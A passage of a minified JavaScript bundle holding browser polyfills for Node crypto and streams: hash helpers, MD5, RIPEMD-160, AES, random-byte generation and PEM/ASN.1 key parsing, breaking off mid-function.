    function m(e, t, n, i, r) { return e + t + n + i + r >>> 0 }

    function g(e, t, n, i) { var r = e[t],
            o = e[t + 1],
            a = i + o >>> 0,
            s = (a < i ? 1 : 0) + n + r;
        e[t] = s >>> 0, e[t + 1] = a }

    function v(e, t, n, i) { return (t + i >>> 0 < t ? 1 : 0) + e + n >>> 0 }

    function y(e, t, n, i) { return t + i >>> 0 }

    function w(e, t, n, i, r, o, a, s) { var c = 0,
            u = t; return u = u + i >>> 0, c += u < t ? 1 : 0, u = u + o >>> 0, c += u < o ? 1 : 0, u = u + s >>> 0, c += u < s ? 1 : 0, e + n + r + a + c >>> 0 }

    function x(e, t, n, i, r, o, a, s) { return t + i + o + s >>> 0 }

    function S(e, t, n, i, r, o, a, s, c, u) { var l = 0,
            d = t; return d = d + i >>> 0, l += d < t ? 1 : 0, d = d + o >>> 0, l += d < o ? 1 : 0, d = d + s >>> 0, l += d < s ? 1 : 0, d = d + u >>> 0, l += d < u ? 1 : 0, e + n + r + a + c + l >>> 0 }

    function _(e, t, n, i, r, o, a, s, c, u) { return t + i + o + s + u >>> 0 }

    function k(e, t, n) { return (t << 32 - n | e >>> n) >>> 0 }

    function C(e, t, n) { return (e << 32 - n | t >>> n) >>> 0 }

    function A(e, t, n) { return e >>> n }

    function E(e, t, n) { return (e << 32 - n | t >>> n) >>> 0 } var T = n(5),
        M = n(0);
    t.inherits = M, t.toArray = i, t.toHex = r, t.htonl = o, t.toHex32 = a, t.zero2 = s, t.zero8 = c, t.join32 = u, t.split32 = l, t.rotr32 = d, t.rotl32 = f, t.sum32 = h, t.sum32_3 = p, t.sum32_4 = b, t.sum32_5 = m, t.sum64 = g, t.sum64_hi = v, t.sum64_lo = y, t.sum64_4_hi = w, t.sum64_4_lo = x, t.sum64_5_hi = S, t.sum64_5_lo = _, t.rotr64_hi = k, t.rotr64_lo = C, t.shr64_hi = A, t.shr64_lo = E }, function(e, t) { var n;
    n = function() { return this }(); try { n = n || Function("return this")() || (0, eval)("this") } catch (e) { "object" == typeof window && (n = window) } e.exports = n }, function(e, t) {
    function n() { throw new Error("setTimeout has not been defined") }

    function i() { throw new Error("clearTimeout has not been defined") }

    function r(e) { if (l === setTimeout) return setTimeout(e, 0); if ((l === n || !l) && setTimeout) return l = setTimeout, setTimeout(e, 0); try { return l(e, 0) } catch (t) { try { return l.call(null, e, 0) } catch (t) { return l.call(this, e, 0) } } }

    function o(e) { if (d === clearTimeout) return clearTimeout(e); if ((d === i || !d) && clearTimeout) return d = clearTimeout, clearTimeout(e); try { return d(e) } catch (t) { try { return d.call(null, e) } catch (t) { return d.call(this, e) } } }

    function a() { b && h && (b = !1, h.length ? p = h.concat(p) : m = -1, p.length && s()) }

    function s() { if (!b) { var e = r(a);
            b = !0; for (var t = p.length; t;) { for (h = p, p = []; ++m < t;) h && h[m].run();
                m = -1, t = p.length } h = null, b = !1, o(e) } }

    function c(e, t) { this.fun = e, this.array = t }

    function u() {} var l, d, f = e.exports = {};! function() { try { l = "function" == typeof setTimeout ? setTimeout : n } catch (e) { l = n } try { d = "function" == typeof clearTimeout ? clearTimeout : i } catch (e) { d = i } }(); var h, p = [],
        b = !1,
        m = -1;
    f.nextTick = function(e) { var t = new Array(arguments.length - 1); if (arguments.length > 1)
            for (var n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
        p.push(new c(e, t)), 1 !== p.length || b || r(s) }, c.prototype.run = function() { this.fun.apply(null, this.array) }, f.title = "browser", f.browser = !0, f.env = {}, f.argv = [], f.version = "", f.versions = {}, f.on = u, f.addListener = u, f.once = u, f.off = u, f.removeListener = u, f.removeAllListeners = u, f.emit = u, f.prependListener = u, f.prependOnceListener = u, f.listeners = function(e) { return [] }, f.binding = function(e) { throw new Error("process.binding is not supported") }, f.cwd = function() { return "/" }, f.chdir = function(e) { throw new Error("process.chdir is not supported") }, f.umask = function() { return 0 } }, function(e, t, n) {
    function i(e) { o.call(this), this.hashMode = "string" == typeof e, this.hashMode ? this[e] = this._finalOrDigest : this.final = this._finalOrDigest, this._final && (this.__final = this._final, this._final = null), this._decoder = null, this._encoding = null } var r = n(1).Buffer,
        o = n(19).Transform,
        a = n(30).StringDecoder;
    n(0)(i, o), i.prototype.update = function(e, t, n) { "string" == typeof e && (e = r.from(e, t)); var i = this._update(e); return this.hashMode ? this : (n && (i = this._toString(i, n)), i) }, i.prototype.setAutoPadding = function() {}, i.prototype.getAuthTag = function() { throw new Error("trying to get auth tag in unsupported state") }, i.prototype.setAuthTag = function() { throw new Error("trying to set auth tag in unsupported state") }, i.prototype.setAAD = function() { throw new Error("trying to set aad in unsupported state") }, i.prototype._transform = function(e, t, n) { var i; try { this.hashMode ? this._update(e) : this.push(this._update(e)) } catch (e) { i = e } finally { n(i) } }, i.prototype._flush = function(e) { var t; try { this.push(this.__final()) } catch (e) { t = e } e(t) }, i.prototype._finalOrDigest = function(e) { var t = this.__final() || r.alloc(0); return e && (t = this._toString(t, e, !0)), t }, i.prototype._toString = function(e, t, n) { if (this._decoder || (this._decoder = new a(t), this._encoding = t), this._encoding !== t) throw new Error("can't switch encodings"); var i = this._decoder.write(e); return n && (i += this._decoder.end()), i }, e.exports = i }, function(e, t, n) { "use strict";

    function i(e) { if (!(this instanceof i)) return new i(e);
        u.call(this, e), l.call(this, e), e && !1 === e.readable && (this.readable = !1), e && !1 === e.writable && (this.writable = !1), this.allowHalfOpen = !0, e && !1 === e.allowHalfOpen && (this.allowHalfOpen = !1), this.once("end", r) }

    function r() { this.allowHalfOpen || this._writableState.ended || a(o, this) }

    function o(e) { e.end() } var a = n(20),
        s = Object.keys || function(e) { var t = []; for (var n in e) t.push(n); return t };
    e.exports = i; var c = n(14);
    c.inherits = n(0); var u = n(38),
        l = n(29);
    c.inherits(i, u); for (var d = s(l.prototype), f = 0; f < d.length; f++) { var h = d[f];
        i.prototype[h] || (i.prototype[h] = l.prototype[h]) } Object.defineProperty(i.prototype, "destroyed", { get: function() { return void 0 !== this._readableState && void 0 !== this._writableState && (this._readableState.destroyed && this._writableState.destroyed) }, set: function(e) { void 0 !== this._readableState && void 0 !== this._writableState && (this._readableState.destroyed = e, this._writableState.destroyed = e) } }), i.prototype._destroy = function(e, t) { this.push(null), this.end(), a(t, e) } }, function(e, t, n) { "use strict";
    (function(t, i) {
        function r() { throw new Error("Secure random number generation is not supported by this browser.\nUse Chrome, Firefox or Internet Explorer 11") }

        function o(e, n) { if (e > 65536) throw new Error("requested too many random bytes"); var r = new t.Uint8Array(e);
            e > 0 && s.getRandomValues(r); var o = a.from(r.buffer); return "function" == typeof n ? i.nextTick(function() { n(null, o) }) : o } var a = n(1).Buffer,
            s = t.crypto || t.msCrypto;
        s && s.getRandomValues ? e.exports = o : e.exports = r }).call(t, n(7), n(8)) }, function(e, t, n) {
    function i(e, t) { this._block = r.alloc(e), this._finalSize = t, this._blockSize = e, this._len = 0 } var r = n(1).Buffer;
    i.prototype.update = function(e, t) { "string" == typeof e && (t = t || "utf8", e = r.from(e, t)); for (var n = this._block, i = this._blockSize, o = e.length, a = this._len, s = 0; s < o;) { for (var c = a % i, u = Math.min(o - s, i - c), l = 0; l < u; l++) n[c + l] = e[s + l];
            a += u, s += u, a % i == 0 && this._update(n) } return this._len += o, this }, i.prototype.digest = function(e) { var t = this._len % this._blockSize;
        this._block[t] = 128, this._block.fill(0, t + 1), t >= this._finalSize && (this._update(this._block), this._block.fill(0)); var n = 8 * this._len; if (n <= 4294967295) this._block.writeUInt32BE(n, this._blockSize - 4);
        else { var i = (4294967295 & n) >>> 0,
                r = (n - i) / 4294967296;
            this._block.writeUInt32BE(r, this._blockSize - 8), this._block.writeUInt32BE(i, this._blockSize - 4) } this._update(this._block); var o = this._hash(); return e ? o.toString(e) : o }, i.prototype._update = function() { throw new Error("_update must be implemented by subclass") }, e.exports = i }, function(e, t, n) { "use strict";
    (function(t) {
        function i(e) { u.call(this, "digest"), this._hash = e, this.buffers = [] }

        function r(e) { u.call(this, "digest"), this._hash = e } var o = n(0),
            a = n(25),
            s = n(26),
            c = n(31),
            u = n(9);
        o(i, u), i.prototype._update = function(e) { this.buffers.push(e) }, i.prototype._final = function() { var e = t.concat(this.buffers),
                n = this._hash(e); return this.buffers = null, n }, o(r, u), r.prototype._update = function(e) { this._hash.update(e) }, r.prototype._final = function() { return this._hash.digest() }, e.exports = function(e) { return e = e.toLowerCase(), "md5" === e ? new i(a) : new r("rmd160" === e || "ripemd160" === e ? new s : c(e)) } }).call(t, n(2).Buffer) }, function(e, t, n) {
    (function(e) {
        function n(e) { return Array.isArray ? Array.isArray(e) : "[object Array]" === m(e) }

        function i(e) { return "boolean" == typeof e }

        function r(e) { return null === e }

        function o(e) { return null == e }

        function a(e) { return "number" == typeof e }

        function s(e) { return "string" == typeof e }

        function c(e) { return "symbol" == typeof e }

        function u(e) { return void 0 === e }

        function l(e) { return "[object RegExp]" === m(e) }

        function d(e) { return "object" == typeof e && null !== e }

        function f(e) { return "[object Date]" === m(e) }

        function h(e) { return "[object Error]" === m(e) || e instanceof Error }

        function p(e) { return "function" == typeof e }

        function b(e) { return null === e || "boolean" == typeof e || "number" == typeof e || "string" == typeof e || "symbol" == typeof e || void 0 === e }

        function m(e) { return Object.prototype.toString.call(e) } t.isArray = n, t.isBoolean = i, t.isNull = r, t.isNullOrUndefined = o, t.isNumber = a, t.isString = s, t.isSymbol = c, t.isUndefined = u, t.isRegExp = l, t.isObject = d, t.isDate = f, t.isError = h, t.isFunction = p, t.isPrimitive = b, t.isBuffer = e.isBuffer }).call(t, n(2).Buffer) }, function(e, t, n) {
    (function(t) { e.exports = function(e, n) { for (var i = Math.min(e.length, n.length), r = new t(i), o = 0; o < i; ++o) r[o] = e[o] ^ n[o]; return r } }).call(t, n(2).Buffer) }, function(e, t, n) { "use strict";

    function i() { this.pending = null, this.pendingTotal = 0, this.blockSize = this.constructor.blockSize, this.outSize = this.constructor.outSize, this.hmacStrength = this.constructor.hmacStrength, this.padLength = this.constructor.padLength / 8, this.endian = "big", this._delta8 = this.blockSize / 8, this._delta32 = this.blockSize / 32 } var r = n(6),
        o = n(5);
    t.BlockHash = i, i.prototype.update = function(e, t) { if (e = r.toArray(e, t), this.pending ? this.pending = this.pending.concat(e) : this.pending = e, this.pendingTotal += e.length, this.pending.length >= this._delta8) { e = this.pending; var n = e.length % this._delta8;
            this.pending = e.slice(e.length - n, e.length), 0 === this.pending.length && (this.pending = null), e = r.join32(e, 0, e.length - n, this.endian); for (var i = 0; i < e.length; i += this._delta32) this._update(e, i, i + this._delta32) } return this }, i.prototype.digest = function(e) { return this.update(this._pad()), o(null === this.pending), this._digest(e) }, i.prototype._pad = function() { var e = this.pendingTotal,
            t = this._delta8,
            n = t - (e + this.padLength) % t,
            i = new Array(n + this.padLength);
        i[0] = 128; for (var r = 1; r < n; r++) i[r] = 0; if (e <<= 3, "big" === this.endian) { for (var o = 8; o < this.padLength; o++) i[r++] = 0;
            i[r++] = 0, i[r++] = 0, i[r++] = 0, i[r++] = 0, i[r++] = e >>> 24 & 255, i[r++] = e >>> 16 & 255, i[r++] = e >>> 8 & 255, i[r++] = 255 & e } else
            for (i[r++] = 255 & e, i[r++] = e >>> 8 & 255, i[r++] = e >>> 16 & 255, i[r++] = e >>> 24 & 255, i[r++] = 0, i[r++] = 0, i[r++] = 0, i[r++] = 0, o = 8; o < this.padLength; o++) i[r++] = 0; return i } }, function(e, t, n) { var i = t;
    i.bignum = n(3), i.define = n(143).define, i.base = n(18), i.constants = n(63), i.decoders = n(149), i.encoders = n(151) }, function(e, t, n) { var i = t;
    i.Reporter = n(146).Reporter, i.DecoderBuffer = n(62).DecoderBuffer, i.EncoderBuffer = n(62).EncoderBuffer, i.Node = n(147) }, function(e, t, n) {
    function i() { r.call(this) } e.exports = i; var r = n(27).EventEmitter;
    n(0)(i, r), i.Readable = n(28), i.Writable = n(83), i.Duplex = n(84), i.Transform = n(85), i.PassThrough = n(86), i.Stream = i, i.prototype.pipe = function(e, t) {
        function n(t) { e.writable && !1 === e.write(t) && u.pause && u.pause() }

        function i() { u.readable && u.resume && u.resume() }

        function o() { l || (l = !0, e.end()) }

        function a() { l || (l = !0, "function" == typeof e.destroy && e.destroy()) }

        function s(e) { if (c(), 0 === r.listenerCount(this, "error")) throw e }

        function c() { u.removeListener("data", n), e.removeListener("drain", i), u.removeListener("end", o), u.removeListener("close", a), u.removeListener("error", s), e.removeListener("error", s), u.removeListener("end", c), u.removeListener("close", c), e.removeListener("close", c) } var u = this;
        u.on("data", n), e.on("drain", i), e._isStdio || t && !1 === t.end || (u.on("end", o), u.on("close", a)); var l = !1; return u.on("error", s), e.on("error", s), u.on("end", c), u.on("close", c), e.on("close", c), e.emit("pipe", u), e } }, function(e, t, n) { "use strict";
    (function(t) {
        function n(e, n, i, r) { if ("function" != typeof e) throw new TypeError('"callback" argument must be a function'); var o, a, s = arguments.length; switch (s) {
                case 0:
                case 1:
                    return t.nextTick(e);
                case 2:
                    return t.nextTick(function() { e.call(null, n) });
                case 3:
                    return t.nextTick(function() { e.call(null, n, i) });
                case 4:
                    return t.nextTick(function() { e.call(null, n, i, r) });
                default:
                    for (o = new Array(s - 1), a = 0; a < o.length;) o[a++] = arguments[a]; return t.nextTick(function() { e.apply(null, o) }) } }!t.version || 0 === t.version.indexOf("v0.") || 0 === t.version.indexOf("v1.") && 0 !== t.version.indexOf("v1.8.") ? e.exports = n : e.exports = t.nextTick }).call(t, n(8)) }, function(e, t, n) {
    function i(e, t, n, i) { if (r.isBuffer(e) || (e = r.from(e, "binary")), t && (r.isBuffer(t) || (t = r.from(t, "binary")), 8 !== t.length)) throw new RangeError("salt should be Buffer with 8 byte length"); for (var a = n / 8, s = r.alloc(a), c = r.alloc(i || 0), u = r.alloc(0); a > 0 || i > 0;) { var l = new o;
            l.update(u), l.update(e), t && l.update(t), u = l.digest(); var d = 0; if (a > 0) { var f = s.length - a;
                d = Math.min(a, u.length), u.copy(s, f, 0, d), a -= d } if (d < u.length && i > 0) { var h = c.length - i,
                    p = Math.min(i, u.length - d);
                u.copy(c, h, d, d + p), i -= p } } return u.fill(0), { key: s, iv: c } } var r = n(1).Buffer,
        o = n(95);
    e.exports = i }, function(e, t, n) {
    function i(e) { s.isBuffer(e) || (e = s.from(e)); for (var t = e.length / 4 | 0, n = new Array(t), i = 0; i < t; i++) n[i] = e.readUInt32BE(4 * i); return n }

    function r(e) { for (; 0 < e.length; e++) e[0] = 0 }

    function o(e, t, n, i, r) { for (var o, a, s, c, u = n[0], l = n[1], d = n[2], f = n[3], h = e[0] ^ t[0], p = e[1] ^ t[1], b = e[2] ^ t[2], m = e[3] ^ t[3], g = 4, v = 1; v < r; v++) o = u[h >>> 24] ^ l[p >>> 16 & 255] ^ d[b >>> 8 & 255] ^ f[255 & m] ^ t[g++], a = u[p >>> 24] ^ l[b >>> 16 & 255] ^ d[m >>> 8 & 255] ^ f[255 & h] ^ t[g++], s = u[b >>> 24] ^ l[m >>> 16 & 255] ^ d[h >>> 8 & 255] ^ f[255 & p] ^ t[g++], c = u[m >>> 24] ^ l[h >>> 16 & 255] ^ d[p >>> 8 & 255] ^ f[255 & b] ^ t[g++], h = o, p = a, b = s, m = c; return o = (i[h >>> 24] << 24 | i[p >>> 16 & 255] << 16 | i[b >>> 8 & 255] << 8 | i[255 & m]) ^ t[g++], a = (i[p >>> 24] << 24 | i[b >>> 16 & 255] << 16 | i[m >>> 8 & 255] << 8 | i[255 & h]) ^ t[g++], s = (i[b >>> 24] << 24 | i[m >>> 16 & 255] << 16 | i[h >>> 8 & 255] << 8 | i[255 & p]) ^ t[g++], c = (i[m >>> 24] << 24 | i[h >>> 16 & 255] << 16 | i[p >>> 8 & 255] << 8 | i[255 & b]) ^ t[g++], o >>>= 0, a >>>= 0, s >>>= 0, c >>>= 0, [o, a, s, c] }

    function a(e) { this._key = i(e), this._reset() } var s = n(1).Buffer,
        c = [0, 1, 2, 4, 8, 16, 32, 64, 128, 27, 54],
        u = function() { for (var e = new Array(256), t = 0; t < 256; t++) e[t] = t < 128 ? t << 1 : t << 1 ^ 283; for (var n = [], i = [], r = [
                    [],
                    [],
                    [],
                    []
                ], o = [
                    [],
                    [],
                    [],
                    []
                ], a = 0, s = 0, c = 0; c < 256; ++c) { var u = s ^ s << 1 ^ s << 2 ^ s << 3 ^ s << 4;
                u = u >>> 8 ^ 255 & u ^ 99, n[a] = u, i[u] = a; var l = e[a],
                    d = e[l],
                    f = e[d],
                    h = 257 * e[u] ^ 16843008 * u;
                r[0][a] = h << 24 | h >>> 8, r[1][a] = h << 16 | h >>> 16, r[2][a] = h << 8 | h >>> 24, r[3][a] = h, h = 16843009 * f ^ 65537 * d ^ 257 * l ^ 16843008 * a, o[0][u] = h << 24 | h >>> 8, o[1][u] = h << 16 | h >>> 16, o[2][u] = h << 8 | h >>> 24, o[3][u] = h, 0 === a ? a = s = 1 : (a = l ^ e[e[e[f ^ l]]], s ^= e[e[s]]) } return { SBOX: n, INV_SBOX: i, SUB_MIX: r, INV_SUB_MIX: o } }();
    a.blockSize = 16, a.keySize = 32, a.prototype.blockSize = a.blockSize, a.prototype.keySize = a.keySize, a.prototype._reset = function() { for (var e = this._key, t = e.length, n = t + 6, i = 4 * (n + 1), r = [], o = 0; o < t; o++) r[o] = e[o]; for (o = t; o < i; o++) { var a = r[o - 1];
            o % t == 0 ? (a = a << 8 | a >>> 24, a = u.SBOX[a >>> 24] << 24 | u.SBOX[a >>> 16 & 255] << 16 | u.SBOX[a >>> 8 & 255] << 8 | u.SBOX[255 & a], a ^= c[o / t | 0] << 24) : t > 6 && o % t == 4 && (a = u.SBOX[a >>> 24] << 24 | u.SBOX[a >>> 16 & 255] << 16 | u.SBOX[a >>> 8 & 255] << 8 | u.SBOX[255 & a]), r[o] = r[o - t] ^ a } for (var s = [], l = 0; l < i; l++) { var d = i - l,
                f = r[d - (l % 4 ? 0 : 4)];
            s[l] = l < 4 || d <= 4 ? f : u.INV_SUB_MIX[0][u.SBOX[f >>> 24]] ^ u.INV_SUB_MIX[1][u.SBOX[f >>> 16 & 255]] ^ u.INV_SUB_MIX[2][u.SBOX[f >>> 8 & 255]] ^ u.INV_SUB_MIX[3][u.SBOX[255 & f]] } this._nRounds = n, this._keySchedule = r, this._invKeySchedule = s }, a.prototype.encryptBlockRaw = function(e) { return e = i(e), o(e, this._keySchedule, u.SUB_MIX, u.SBOX, this._nRounds) }, a.prototype.encryptBlock = function(e) { var t = this.encryptBlockRaw(e),
            n = s.allocUnsafe(16); return n.writeUInt32BE(t[0], 0), n.writeUInt32BE(t[1], 4), n.writeUInt32BE(t[2], 8), n.writeUInt32BE(t[3], 12), n }, a.prototype.decryptBlock = function(e) { e = i(e); var t = e[1];
        e[1] = e[3], e[3] = t; var n = o(e, this._invKeySchedule, u.INV_SUB_MIX, u.INV_SBOX, this._nRounds),
            r = s.allocUnsafe(16); return r.writeUInt32BE(n[0], 0), r.writeUInt32BE(n[3], 4), r.writeUInt32BE(n[2], 8), r.writeUInt32BE(n[1], 12), r }, a.prototype.scrub = function() { r(this._keySchedule), r(this._invKeySchedule), r(this._key) }, e.exports.AES = a }, function(e, t, n) { "use strict"; var i = t;
    i.base = n(123), i.short = n(124), i.mont = n(125), i.edwards = n(126) }, function(e, t, n) {
    (function(t) {
        function i(e) { var n; "object" != typeof e || t.isBuffer(e) || (n = e.passphrase, e = e.key), "string" == typeof e && (e = new t(e)); var i, a, c = s(e, n),
                u = c.tag,
                l = c.data; switch (u) {
                case "CERTIFICATE":
                    a = o.certificate.decode(l, "der").tbsCertificate.subjectPublicKeyInfo;
                case "PUBLIC KEY":
                    switch (a || (a = o.PublicKey.decode(l, "der")), i = a.algorithm.algorithm.join(".")) {
                        case "1.2.840.113549.1.1.1":
                            return o.RSAPublicKey.decode(a.subjectPublicKey.data, "der");
                        case "1.2.840.10045.2.1":
                            return a.subjectPrivateKey = a.subjectPublicKey, { type: "ec", data: a };
                        case "1.2.840.10040.4.1":
                            return a.algorithm.params.pub_key = o.DSAparam.decode(a.subjectPublicKey.data, "der"), { type: "dsa", data: a.algorithm.params };
                        default:
                            throw new Error("unknown key id " + i) } throw new Error("unknown key type " + u);
                case "ENCRYPTED PRIVATE KEY":
                    l = o.EncryptedPrivateKey.decode(l, "der"), l = r(l, n);
                case "PRIVATE KEY":
                    switch (a = o.PrivateKey.decode(l, "der"), i = a.algorithm.algorithm.join(".")) {
                        case "1.2.840.113549.1.1.1":
                            return o.RSAPrivateKey.decode(a.subjectPrivateKey, "der");
                        case "1.2.840.10045.2.1":
                            return { curve: a.algorithm.curve, privateKey: o.ECPrivateKey.decode(a.subjectPrivateKey, "der").privateKey };
                        case "1.2.840.10040.4.1":
                            return a.algorithm.params.priv_key = o.DSAparam.decode(a.subjectPrivateKey, "der"), { type: "dsa", params: a.algorithm.params };
                        default:
                            throw new Error("unknown key id " + i) } throw new Error("unknown key type " + u);
                case "RSA PUBLIC KEY":
                    return o.RSAPublicKey.decode(l, "der");
                case "RSA PRIVATE KEY":
                    return o.RSAPrivateKey.decode(l, "der");
                case "DSA PRIVATE KEY":
                    return { type: "dsa", params: o.DSAPrivateKey.decode(l, "der") };
                case "EC PRIVATE KEY":
                    return l = o.ECPrivateKey.decode(l, "der"), { curve: l.parameters.value, privateKey: l.privateKey };
                default:
                    throw new Error("unknown key type " + u) } }

        function r(e, n) { var i = e.algorithm.decrypt.kde.kdeparams.salt,
                r = parseInt(e.algorithm.decrypt.kde.kdeparams.iters.toString(), 10),
                o = a[e.algorithm.decrypt.cipher.algo.join(".")],
                s = e.algorithm.decrypt.cipher.iv,
                l = e.subjectPrivateKey,
                d = parseInt(o.split("-")[1], 10) / 8,
                f = u.pbkdf2Sync(n, i, r, d),
                h = c.createDecipheriv(o, f, s),
                p = []; return p.push(h.update(l)), p.push(h.final()), t.concat(p) } var o = n(142),
            a = n(154),
            s = n(155),
            c = n(32),
            u = n(46);
        e.exports = i, i.signature = o.signature }).call(t, n(2).Buffer) }, function(e, t, n) { "use strict";

    function i(e, t) { e[t >> 5] |= 128 << t % 32, e[14 + (t + 64 >>> 9 << 4)] = t; for (var n = 1732584193, i = -271733879, r = -1732584194, l = 271733878, d = 0; d < e.length; d += 16) { var f = n,
                h = i,
                p = r,
                b = l;
            n = o(n, i, r, l, e[d + 0], 7, -680876936), l = o(l, n, i, r, e[d + 1], 12, -389564586), r = o(r, l, n, i, e[d + 2], 17, 606105819), i = o(i, r, l, n, e[d + 3], 22, -1044525330), n = o(n, i, r, l, e[d + 4], 7, -176418897), l = o(l, n, i, r, e[d + 5], 12, 1200080426), r = o(r, l, n, i, e[d + 6], 17, -1473231341), i = o(i, r, l, n, e[d + 7], 22, -45705983), n = o(n, i, r, l, e[d + 8], 7, 1770035416), l = o(l, n, i, r, e[d + 9], 12, -1958414417), r = o(r, l, n, i, e[d + 10], 17, -42063), i = o(i, r, l, n, e[d + 11], 22, -1990404162), n = o(n, i, r, l, e[d + 12], 7, 1804603682), l = o(l, n, i, r, e[d + 13], 12, -40341101), r = o(r, l, n, i, e[d + 14], 17, -1502002290), i = o(i, r, l, n, e[d + 15], 22, 1236535329), n = a(n, i, r, l, e[d + 1], 5, -165796510), l = a(l, n, i, r, e[d + 6], 9, -1069501632), r = a(r, l, n, i, e[d + 11], 14, 643717713), i = a(i, r, l, n, e[d + 0], 20, -373897302), n = a(n, i, r, l, e[d + 5], 5, -701558691), l = a(l, n, i, r, e[d + 10], 9, 38016083), r = a(r, l, n, i, e[d + 15], 14, -660478335), i = a(i, r, l, n, e[d + 4], 20, -405537848), n = a(n, i, r, l, e[d + 9], 5, 568446438), l = a(l, n, i, r, e[d + 14], 9, -1019803690), r = a(r, l, n, i, e[d + 3], 14, -187363961), i = a(i, r, l, n, e[d + 8], 20, 1163531501), n = a(n, i, r, l, e[d + 13], 5, -1444681467), l = a(l, n, i, r, e[d + 2], 9, -51403784), r = a(r, l, n, i, e[d + 7], 14, 1735328473), i = a(i, r, l, n, e[d + 12], 20, -1926607734), n = s(n, i, r, l, e[d + 5], 4, -378558), l = s(l, n, i, r, e[d + 8], 11, -2022574463), r = s(r, l, n, i, e[d + 11], 16, 1839030562), i = s(i, r, l, n, e[d + 14], 23, -35309556), n = s(n, i, r, l, e[d + 1], 4, -1530992060), l = s(l, n, i, r, e[d + 4], 11, 1272893353), r = s(r, l, n, i, e[d + 7], 16, -155497632), i = s(i, r, l, n, e[d + 10], 23, -1094730640), n = s(n, i, r, l, e[d + 13], 4, 681279174), l = s(l, n, i, r, e[d + 0], 11, -358537222), r = s(r, l, n, i, e[d + 3], 16, -722521979), i = s(i, r, l, n, e[d + 6], 23, 76029189), n = s(n, i, r, l, e[d + 9], 4, -640364487), l = s(l, n, i, r, e[d + 12], 11, -421815835), r = s(r, l, n, i, e[d + 15], 16, 530742520), i = s(i, r, l, n, e[d + 2], 23, -995338651), n = c(n, i, r, l, e[d + 0], 6, -198630844), l = c(l, n, i, r, e[d + 7], 10, 1126891415), r = c(r, l, n, i, e[d + 14], 15, -1416354905), i = c(i, r, l, n, e[d + 5], 21, -57434055), n = c(n, i, r, l, e[d + 12], 6, 1700485571), l = c(l, n, i, r, e[d + 3], 10, -1894986606), r = c(r, l, n, i, e[d + 10], 15, -1051523), i = c(i, r, l, n, e[d + 1], 21, -2054922799), n = c(n, i, r, l, e[d + 8], 6, 1873313359), l = c(l, n, i, r, e[d + 15], 10, -30611744), r = c(r, l, n, i, e[d + 6], 15, -1560198380), i = c(i, r, l, n, e[d + 13], 21, 1309151649), n = c(n, i, r, l, e[d + 4], 6, -145523070), l = c(l, n, i, r, e[d + 11], 10, -1120210379), r = c(r, l, n, i, e[d + 2], 15, 718787259), i = c(i, r, l, n, e[d + 9], 21, -343485551), n = u(n, f), i = u(i, h), r = u(r, p), l = u(l, b) } return [n, i, r, l] }

    function r(e, t, n, i, r, o) { return u(l(u(u(t, e), u(i, o)), r), n) }

    function o(e, t, n, i, o, a, s) { return r(t & n | ~t & i, e, t, o, a, s) }

    function a(e, t, n, i, o, a, s) { return r(t & i | n & ~i, e, t, o, a, s) }

    function s(e, t, n, i, o, a, s) { return r(t ^ n ^ i, e, t, o, a, s) }

    function c(e, t, n, i, o, a, s) { return r(n ^ (t | ~i), e, t, o, a, s) }

    function u(e, t) { var n = (65535 & e) + (65535 & t); return (e >> 16) + (t >> 16) + (n >> 16) << 16 | 65535 & n }

    function l(e, t) { return e << t | e >>> 32 - t } var d = n(75);
    e.exports = function(e) { return d(e, i) } }, function(e, t, n) { "use strict";
    (function(t) {
        function i() { d.call(this, 64), this._a = 1732584193, this._b = 4023233417, this._c = 2562383102, this._d = 271733878, this._e = 3285377520 }

        function r(e, t) { return e << t | e >>> 32 - t }

        function o(e, t, n, i, o, a, s, c) { return r(e + (t ^ n ^ i) + a + s | 0, c) + o | 0 }

        function a(e, t, n, i, o, a, s, c) { return r(e + (t & n | ~t & i) + a + s | 0, c) + o | 0 }

        function s(e, t, n, i, o, a, s, c) { return r(e + ((t | ~n) ^ i) + a + s | 0, c) + o | 0 }

        function c(e, t, n, i, o, a, s, c) { return r(e + (t & i | n & ~i) + a + s | 0, c) + o | 0 }

        function u(e, t, n, i, o, a, s, c) { return r(e + (t ^ (n | ~i)) + a + s | 0, c) + o | 0 } var l = n(0),
            d = n(76);
        l(i, d), i.prototype._update = function() { for (var e = new Array(16), t = 0; t < 16; ++t) e[t] = this._block.readInt32LE(4 * t); var n = this._a,
                i = this._b,
                l = this._c,
                d = this._d,
                f = this._e;
            n = o(n, i, l, d, f, e[0], 0, 11), l = r(l, 10), f = o(f, n, i, l, d, e[1], 0, 14), i = r(i, 10), d = o(d, f, n, i, l, e[2], 0, 15), n = r(n, 10), l = o(l, d, f, n, i, e[3], 0, 12), f = r(f, 10), i = o(i, l, d, f, n, e[4], 0, 5), d = r(d, 10), n = o(n, i, l, d, f, e[5], 0, 8), l = r(l, 10), f = o(f, n, i, l, d, e[6], 0, 7), i = r(i, 10), d = o(d, f, n, i, l, e[7], 0, 9), n = r(n, 10), l = o(l, d, f, n, i, e[8], 0, 11), f = r(f, 10), i = o(i, l, d, f, n, e[9], 0, 13), d = r(d, 10), n = o(n, i, l, d, f, e[10], 0, 14), l = r(l, 10), f = o(f, n, i, l, d, e[11], 0, 15), i = r(i, 10), d = o(d, f, n, i, l, e[12], 0, 6), n = r(n, 10), l = o(l, d, f, n, i, e[13], 0, 7), f = r(f, 10), i = o(i, l, d, f, n, e[14], 0, 9), d = r(d, 10), n = o(n, i, l, d, f, e[15], 0, 8), l = r(l, 10), f = a(f, n, i, l, d, e[7], 1518500249, 7), i = r(i, 10), d = a(d, f, n, i, l, e[4], 1518500249, 6), n = r(n, 10), l = a(l, d, f, n, i, e[13], 1518500249, 8), f = r(f, 10), i = a(i, l, d, f, n, e[1], 1518500249, 13), d = r(d, 10), n = a(n, i, l, d, f, e[10], 1518500249, 11), l = r(l, 10), f = a(f, n, i, l, d, e[6], 1518500249, 9), i = r(i, 10), d = a(d, f, n, i, l, e[15], 1518500249, 7), n = r(n, 10), l = a(l, d, f, n, i, e[3], 1518500249, 15), f = r(f, 10), i = a(i, l, d, f, n, e[12], 1518500249, 7), d = r(d, 10), n = a(n, i, l, d, f, e[0], 1518500249, 12), l = r(l, 10), f = a(f, n, i, l, d, e[9], 1518500249, 15), i = r(i, 10), d = a(d, f, n, i, l, e[5], 1518500249, 9), n = r(n, 10), l = a(l, d, f, n, i, e[2], 1518500249, 11), f = r(f, 10), i = a(i, l, d, f, n, e[14], 1518500249, 7), d = r(d, 10), n = a(n, i, l, d, f, e[11], 1518500249, 13), l = r(l, 10), f = a(f, n, i, l, d, e[8], 